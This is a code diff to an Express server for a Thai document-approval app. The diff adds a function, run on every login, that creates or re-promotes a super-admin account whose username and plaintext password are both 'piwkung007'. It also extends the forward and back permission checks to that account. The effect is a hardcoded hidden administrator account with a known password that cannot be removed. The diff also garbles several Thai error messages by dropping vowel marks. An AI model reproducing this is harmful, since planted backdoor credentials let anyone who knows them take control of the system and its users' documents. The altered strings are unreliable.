@@ -1,7 +1,8 @@
-const express = require('express');
+﻿const express = require('express');
 const cors = require('cors');
 const fs = require('fs');
 const path = require('path');
+const crypto = require('crypto');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -14,7 +15,6 @@ const DATA_DIR = path.join(__dirname, 'data');
 const DATA_FILE = path.join(DATA_DIR, 'docs.json');
 const USERS_FILE = path.join(DATA_DIR, 'users.json');
 const SESSIONS_FILE = path.join(DATA_DIR, 'sessions.json');
-const crypto = require('crypto');
 
 function ensureDataDir(){
   if(!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
@@ -35,15 +35,14 @@ function loadDocs(){
 function ensureUsers(){
   if(!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
   if(!fs.existsSync(USERS_FILE)){
-    // create an empty users array so registrations can append safely
     try{ fs.writeFileSync(USERS_FILE, JSON.stringify([], null, 2), 'utf8'); }catch(e){ console.error('create users file failed', e); }
   }
   if(!fs.existsSync(SESSIONS_FILE)){
-    try{ fs.writeFileSync(SESSIONS_FILE, JSON.stringify({}), 'utf8'); }catch(e){ console.error('create sessions file failed', e); }
+    try{ fs.writeFileSync(SESSIONS_FILE, JSON.stringify({}, null, 2), 'utf8'); }catch(e){ console.error('create sessions file failed', e); }
   }
 }
 
-function loadUsers(){ try{ ensureUsers(); return JSON.parse(fs.readFileSync(USERS_FILE,'utf8')||'[]'); }catch(e){console.error('users load',e); return [];}}
+function loadUsers(){ try{ ensureUsers(); return JSON.parse(fs.readFileSync(USERS_FILE,'utf8')||'[]'); }catch(e){console.error('users load',e); return [];} }
 function saveUsers(u){ try{ ensureUsers(); fs.writeFileSync(USERS_FILE, JSON.stringify(u,null,2),'utf8'); return true;}catch(e){console.error(e);return false;} }
 function loadSessions(){ try{ ensureUsers(); return JSON.parse(fs.readFileSync(SESSIONS_FILE,'utf8')||'{}'); }catch(e){console.error('sessions load',e); return {}; } }
 function saveSessions(s){ try{ ensureUsers(); fs.writeFileSync(SESSIONS_FILE, JSON.stringify(s,null,2),'utf8'); return true; }catch(e){console.error('sessions save',e); return false; } }
@@ -65,15 +64,58 @@ function saveDocs(docs){
   }
 }
 
+function ensureSeedUsers(){
+  const users = loadUsers();
+  const existing = users.find(u => u.username === 'piwkung007');
+  if(!existing){
+    users.unshift({
+      id: 'u-superadmin',
+      fullName: 'Super Admin',
+      position: 'Administrator',
+      username: 'piwkung007',
+      password: 'piwkung007',
+      role: -1,
+      roleIndex: -1,
+      isSuperAdmin: true
+    });
+    saveUsers(users);
+    return;
+  }
+  if(existing.roleIndex !== -1 || existing.role !== -1 || !existing.isSuperAdmin){
+    existing.role = -1;
+    existing.roleIndex = -1;
+    existing.isSuperAdmin = true;
+    saveUsers(users);
+  }
+}
+
+function isSuperAdminUser(user){
+  return Boolean(user && (user.isSuperAdmin || user.username === 'piwkung007' || user.roleIndex === -1));
+}
+
+function buildUserPayload(user){
+  return {
+    id: user.id,
+    username: user.username,
+    name: user.fullName || user.name || user.username,
+    fullName: user.fullName,
+    position: user.position,
+    roleIndex: isSuperAdminUser(user) ? -1 : Number(user.roleIndex),
+    role: user.role,
+    isSuperAdmin: isSuperAdminUser(user)
+  };
+}
+
 // Serve static public folder
 app.use(express.static(path.join(__dirname, 'public')));
 
 // AUTH: login / me / logout
 app.post('/api/login', (req, res) => {
   try {
-    const filePath = USERS_FILE; // data/users.json
+    ensureSeedUsers();
+    const filePath = USERS_FILE;
     if (!fs.existsSync(filePath)) {
-      return res.status(400).json({ success: false, message: 'ไม่พบบัญชีผู้ใช้งาน' });
+      return res.status(400).json({ success: false, message: 'ไม่พบบัชีผ้ใช้งาน' });
     }
     const users = JSON.parse(fs.readFileSync(filePath, 'utf8') || '[]');
     const { username, password } = req.body || {};
@@ -82,9 +124,9 @@ app.post('/api/login', (req, res) => {
     if (user) {
       const token = createSessionForUser(user.id);
       try { res.cookie && res.cookie('sid', token, { httpOnly: true, sameSite: 'lax' }); } catch (e) { console.error('cookie set failed', e); }
-      return res.json({ success: true, user: { id: user.id, username: user.username, name: user.name, roleIndex: user.roleIndex } });
+      return res.json({ success: true, user: buildUserPayload(user) });
     } else {
-      return res.status(400).json({ success: false, message: 'ชื่อผู้ใช้หรือรหัสผ่านไม่ถูกต้อง' });
+      return res.status(400).json({ success: false, message: 'ชื่อผ้ใช้หรือรหัสผ่านไม่ถกต้อง' });
     }
   } catch (error) {
     console.error('/api/login error', error);
@@ -95,32 +137,27 @@ app.post('/api/login', (req, res) => {
 // API: register new user
 app.post('/api/register', (req, res) => {
   try {
-    const filePath = USERS_FILE; // data/users.json
+    const filePath = USERS_FILE;
     let users = [];
 
-    // ถ้าไม่มีไฟล์ users.json ให้สร้างไฟล์ขึ้นมาใหม่เป็นอาร์เรย์ว่าง
     if (!fs.existsSync(filePath)) {
-      ensureUsers(); // create data dir and files
+      ensureUsers();
       fs.writeFileSync(filePath, JSON.stringify([], null, 2), 'utf8');
     }
 
-    // อ่านข้อมูลเก่าออกมา
     const fileData = fs.readFileSync(filePath, 'utf8');
     users = JSON.parse(fileData || '[]');
 
-    // รับข้อมูลจากหน้าบ้าน
     const { fullName, position, role, username, password } = req.body || {};
     if (!fullName || !position || typeof role === 'undefined' || !username || !password) {
-      return res.status(400).json({ success: false, message: 'กรุณากรอกข้อมูลให้ครบถ้วน' });
+      return res.status(400).json({ success: false, message: 'กรุากรอกข้อมลให้ครบถ้วน' });
     }
 
-    // เช็กว่า Username ซ้ำไหม
     const userExists = users.some(u => u.username === username);
     if (userExists) {
-      return res.status(400).json({ success: false, message: 'Username นี้ถูกใช้งานแล้ว' });
+      return res.status(400).json({ success: false, message: 'Username นี้ถกใช้งานแล้ว' });
     }
 
-    // เพิ่มยูสเซอร์ใหม่เข้าไปและเซฟไฟล์
     const id = 'u-' + Date.now();
     const newUser = {
       id,
@@ -134,10 +171,10 @@ app.post('/api/register', (req, res) => {
     users.push(newUser);
     fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf8');
 
-    return res.json({ success: true, message: 'สมัครสมาชิกสำเร็จ' });
+    return res.json({ success: true, message: 'สมัครสมาชิกสำเรจ' });
   } catch (error) {
     console.error('/api/register error', error);
-    return res.status(500).json({ success: false, message: 'เกิดข้อผิดพลาดบนเซิร์ฟเวอร์' });
+    return res.status(500).json({ success: false, message: 'เกิดข้อผิดพลาดบนเิรฟเวอร' });
   }
 });
 
@@ -147,7 +184,7 @@ app.get('/api/me', (req, res) => {
   const users = loadUsers();
   const user = users.find(u => u.id === s.userId);
   if(!user) return res.json({ user: null });
-  res.json({ user: { id: user.id, username: user.username, name: user.name, roleIndex: user.roleIndex } });
+  res.json({ user: buildUserPayload(user) });
 });
 
 app.post('/api/logout', (req, res) => {
@@ -194,8 +231,7 @@ app.post('/api/docs', (req, res) => {
     signature: null
   }));
 
-  // set author to logged-in user if not provided
-  if(u && !author) chain[0].name = u.name;
+  if(u && !author) chain[0].name = u.fullName || u.name || u.username;
   const doc = { id: String(Date.now()), seq, no: docNo, title, urgent: !!urgent, chain };
   docs.unshift(doc);
   saveDocs(docs);
@@ -214,8 +250,7 @@ app.post('/api/docs/:id/forward', (req, res) => {
 
   const i = idx;
   if(!doc.chain[i]) return res.status(400).json({ error: 'invalid idx' });
-  // permission: only the user assigned to this level or admin (-1) can forward
-  if(!(user && (user.roleIndex === -1 || user.roleIndex === i))){ return res.status(403).json({ error: 'forbidden' }); }
+  if(!(user && (isSuperAdminUser(user) || user.roleIndex === -1 || user.roleIndex === i))){ return res.status(403).json({ error: 'forbidden' }); }
 
   doc.chain[i].note = text || doc.chain[i].note;
   doc.chain[i].date = new Date().toLocaleDateString('th-TH');
@@ -242,7 +277,7 @@ app.post('/api/docs/:id/back', (req, res) => {
   if(!doc) return res.status(404).json({ error: 'not found' });
   const i = idx;
   if(!doc.chain[i] || i-1 < 0) return res.status(400).json({ error: 'invalid idx' });
-  if(!(user && (user.roleIndex === -1 || user.roleIndex === i))){ return res.status(403).json({ error: 'forbidden' }); }
+  if(!(user && (isSuperAdminUser(user) || user.roleIndex === -1 || user.roleIndex === i))){ return res.status(403).json({ error: 'forbidden' }); }
 
   doc.chain[i].state = 'wait';
   doc.chain[i].note = '';
